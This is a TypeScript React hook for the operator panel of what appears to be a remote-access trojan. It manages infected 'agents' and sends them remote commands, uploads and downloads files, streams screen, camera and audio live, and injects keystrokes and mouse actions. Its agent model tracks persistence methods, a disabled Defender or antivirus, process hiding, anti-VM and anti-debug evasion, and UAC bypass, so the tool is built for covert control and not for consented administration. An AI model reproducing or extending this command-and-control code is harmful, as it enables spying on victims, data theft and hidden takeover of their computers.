import { useEffect, useRef, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';
import type { Agent, CommandResult, ConfigStatus, FileTransfer, WebRTCStats, QualityData, ProductionReadiness } from '@/types/agent';

interface SocketIOHook {
  socket: Socket | null;
  isConnected: boolean;
  agents: Agent[];
  commandResults: CommandResult[];
  configStatus: ConfigStatus | null;
  fileTransfers: FileTransfer[];
  webrtcStats: { [agentId: string]: WebRTCStats };
  qualityData: { [agentId: string]: QualityData };
  productionReadiness: ProductionReadiness | null;
  
  // Agent management
  executeCommand: (agentId: string, command: string) => void;
  getAgentStats: () => void;
  getSystemHealth: () => void;
  listProcesses: () => void;
  refreshDashboard: () => void;
  
  // File transfer
  uploadFile: (agentId: string, file: File, destinationPath: string) => void;
  downloadFile: (agentId: string, filename: string, localPath?: string) => void;
  
  // WebRTC
  startWebRTCStreaming: (agentId: string, type: 'screen' | 'camera' | 'audio' | 'all') => void;
  stopWebRTCStreaming: (agentId: string) => void;
  getWebRTCStats: (agentId: string) => void;
  setWebRTCQuality: (agentId: string, quality: 'low' | 'medium' | 'high' | 'auto') => void;
  getProductionReadiness: () => void;
  
  // Remote control
  sendKeyPress: (agentId: string, key: string, modifiers?: string[]) => void;
  sendMouseMove: (agentId: string, x: number, y: number) => void;
  sendMouseClick: (agentId: string, x: number, y: number, button: 'left' | 'right' | 'middle') => void;
  
  // Configuration
  changePassword: (currentPassword: string, newPassword: string) => Promise<{ success: boolean; message: string }>;
  getConfigStatus: () => void;
}

export const useSocketIO = (): SocketIOHook => {
  const socketRef = useRef<Socket | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [commandResults, setCommandResults] = useState<CommandResult[]>([]);
  const [configStatus, setConfigStatus] = useState<ConfigStatus | null>(null);
  const [fileTransfers, setFileTransfers] = useState<FileTransfer[]>([]);
  const [webrtcStats, setWebrtcStats] = useState<{ [agentId: string]: WebRTCStats }>({});
  const [qualityData, setQualityData] = useState<{ [agentId: string]: QualityData }>({});
  const [productionReadiness, setProductionReadiness] = useState<ProductionReadiness | null>(null);

  useEffect(() => {
    // Initialize socket connection
    const socket = io({
      transports: ['websocket', 'polling'],
      upgrade: true,
      rememberUpgrade: true
    });

    socketRef.current = socket;

    // Connection events
    socket.on('connect', () => {
      console.log('Socket.IO connected:', socket.id);
      setIsConnected(true);
      socket.emit('operator_connect');
    });

    socket.on('disconnect', () => {
      console.log('Socket.IO disconnected');
      setIsConnected(false);
    });

    // Agent management events
    socket.on('agent_list_update', (agentData: { [id: string]: any }) => {
      const agentList = Object.entries(agentData).map(([id, data]) => ({
        id,
        hostname: data.hostname || `Agent-${id.slice(0, 8)}`,
        ip: data.ip || 'Unknown',
        os: data.os || 'Unknown',
        status: data.sid ? 'online' : 'offline',
        lastSeen: data.last_seen || new Date().toISOString(),
        sid: data.sid,
        capabilities: data.capabilities || [],
        streams: data.streams || { screen: false, camera: false, audio: false },
        persistence: data.persistence || { registry: false, startup: false, scheduledTasks: false, services: false },
        security: data.security || { defenderDisabled: false, avDisabled: false, processHidden: false, antiVm: false, antiDebug: false },
        privileges: data.privileges || { admin: false, uacBypassed: false, method: '' }
      })) as Agent[];
      
      setAgents(agentList);
    });

    socket.on('command_output', (data: { agent_id: string; output: string }) => {
      const result: CommandResult = {
        agent_id: data.agent_id,
        output: data.output,
        timestamp: new Date().toISOString()
      };
      setCommandResults(prev => [result, ...prev.slice(0, 99)]); // Keep last 100 results
    });

    socket.on('terminal_output', (output: string) => {
      console.log('Terminal output:', output);
    });

    // Configuration events
    socket.on('config_status', (status: ConfigStatus) => {
      setConfigStatus(status);
    });

    // File transfer events
    socket.on('file_download_chunk', (data: any) => {
      console.log('File download chunk received:', data);
      // Handle file download progress
      setFileTransfers(prev => prev.map(transfer => 
        transfer.filename === data.filename 
          ? { ...transfer, progress: (data.offset / data.total_size) * 100 }
          : transfer
      ));
    });

    // WebRTC events
    socket.on('webrtc_stats', (data: WebRTCStats & { agent_id: string }) => {
      setWebrtcStats(prev => ({
        ...prev,
        [data.agent_id]: data
      }));
    });

    socket.on('webrtc_enhanced_stats', (data: { agent_id: string; quality_data: QualityData }) => {
      if (data.quality_data) {
        setQualityData(prev => ({
          ...prev,
          [data.agent_id]: data.quality_data
        }));
      }
    });

    socket.on('webrtc_production_readiness', (data: ProductionReadiness) => {
      setProductionReadiness(data);
    });

    socket.on('webrtc_error', (error: { message: string }) => {
      console.error('WebRTC error:', error.message);
    });

    // Agent stats and system health responses
    socket.on('agent_stats_response', (data: any) => {
      console.log('Agent stats received:', data);
    });

    socket.on('system_health_response', (data: any) => {
      console.log('System health received:', data);
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  // Agent management functions
  const executeCommand = useCallback((agentId: string, command: string) => {
    if (socketRef.current) {
      socketRef.current.emit('execute_command', { agent_id: agentId, command });
    }
  }, []);

  const getAgentStats = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('get_agent_stats');
    }
  }, []);

  const getSystemHealth = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('get_system_health');
    }
  }, []);

  const listProcesses = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('list_processes');
    }
  }, []);

  const refreshDashboard = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('refresh_dashboard');
    }
  }, []);

  // File transfer functions
  const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
    if (!socketRef.current) return;

    const chunkSize = 64 * 1024; // 64KB chunks
    const totalChunks = Math.ceil(file.size / chunkSize);
    let currentChunk = 0;

    const transfer: FileTransfer = {
      id: `upload-${Date.now()}`,
      filename: file.name,
      size: file.size,
      progress: 0,
      direction: 'upload',
      status: 'active',
      speed: 0,
      agent_id: agentId
    };

    setFileTransfers(prev => [...prev, transfer]);

    const uploadChunk = () => {
      const start = currentChunk * chunkSize;
      const end = Math.min(start + chunkSize, file.size);
      const chunk = file.slice(start, end);

      const reader = new FileReader();
      reader.onload = () => {
        if (socketRef.current) {
          socketRef.current.emit('upload_file_chunk', {
            agent_id: agentId,
            filename: file.name,
            data: reader.result,
            offset: start,
            destination_path: destinationPath
          });

          currentChunk++;
          const progress = (currentChunk / totalChunks) * 100;

          setFileTransfers(prev => prev.map(t => 
            t.id === transfer.id ? { ...t, progress } : t
          ));

          if (currentChunk < totalChunks) {
            setTimeout(uploadChunk, 10); // Small delay between chunks
          } else {
            socketRef.current.emit('upload_file_end', {
              agent_id: agentId,
              filename: file.name
            });
            setFileTransfers(prev => prev.map(t => 
              t.id === transfer.id ? { ...t, status: 'completed', progress: 100 } : t
            ));
          }
        }
      };
      reader.readAsDataURL(chunk);
    };

    uploadChunk();
  }, []);

  const downloadFile = useCallback((agentId: string, filename: string, localPath?: string) => {
    if (socketRef.current) {
      const transfer: FileTransfer = {
        id: `download-${Date.now()}`,
        filename,
        size: 0,
        progress: 0,
        direction: 'download',
        status: 'active',
        speed: 0,
        agent_id: agentId
      };

      setFileTransfers(prev => [...prev, transfer]);

      socketRef.current.emit('download_file', {
        agent_id: agentId,
        filename,
        local_path: localPath
      });
    }
  }, []);

  // WebRTC functions
  const startWebRTCStreaming = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio' | 'all') => {
    if (socketRef.current) {
      socketRef.current.emit('webrtc_start_streaming', { agent_id: agentId, type });
    }
  }, []);

  const stopWebRTCStreaming = useCallback((agentId: string) => {
    if (socketRef.current) {
      socketRef.current.emit('webrtc_stop_streaming', { agent_id: agentId });
    }
  }, []);

  const getWebRTCStats = useCallback((agentId: string) => {
    if (socketRef.current) {
      socketRef.current.emit('webrtc_get_stats', { agent_id: agentId });
    }
  }, []);

  const setWebRTCQuality = useCallback((agentId: string, quality: 'low' | 'medium' | 'high' | 'auto') => {
    if (socketRef.current) {
      socketRef.current.emit('webrtc_set_quality', { agent_id: agentId, quality });
    }
  }, []);

  const getProductionReadiness = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('webrtc_get_production_readiness');
    }
  }, []);

  // Remote control functions
  const sendKeyPress = useCallback((agentId: string, key: string, modifiers?: string[]) => {
    if (socketRef.current) {
      socketRef.current.emit('live_key_press', { agent_id: agentId, key, modifiers });
    }
  }, []);

  const sendMouseMove = useCallback((agentId: string, x: number, y: number) => {
    if (socketRef.current) {
      socketRef.current.emit('live_mouse_move', { agent_id: agentId, x, y });
    }
  }, []);

  const sendMouseClick = useCallback((agentId: string, x: number, y: number, button: 'left' | 'right' | 'middle') => {
    if (socketRef.current) {
      socketRef.current.emit('live_mouse_click', { agent_id: agentId, x, y, button });
    }
  }, []);

  // Configuration functions
  const changePassword = useCallback(async (currentPassword: string, newPassword: string): Promise<{ success: boolean; message: string }> => {
    try {
      const response = await fetch('/change-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          current_password: currentPassword,
          new_password: newPassword
        })
      });

      const result = await response.json();
      return result;
    } catch (error) {
      return { success: false, message: `Error: ${error}` };
    }
  }, []);

  const getConfigStatus = useCallback(() => {
    if (socketRef.current) {
      socketRef.current.emit('get_config_status');
    }
  }, []);

  return {
    socket: socketRef.current,
    isConnected,
    agents,
    commandResults,
    configStatus,
    fileTransfers,
    webrtcStats,
    qualityData,
    productionReadiness,
    
    executeCommand,
    getAgentStats,
    getSystemHealth,
    listProcesses,
    refreshDashboard,
    
    uploadFile,
    downloadFile,
    
    startWebRTCStreaming,
    stopWebRTCStreaming,
    getWebRTCStats,
    setWebRTCQuality,
    getProductionReadiness,
    
    sendKeyPress,
    sendMouseMove,
    sendMouseClick,
    
    changePassword,
    getConfigStatus
  };
};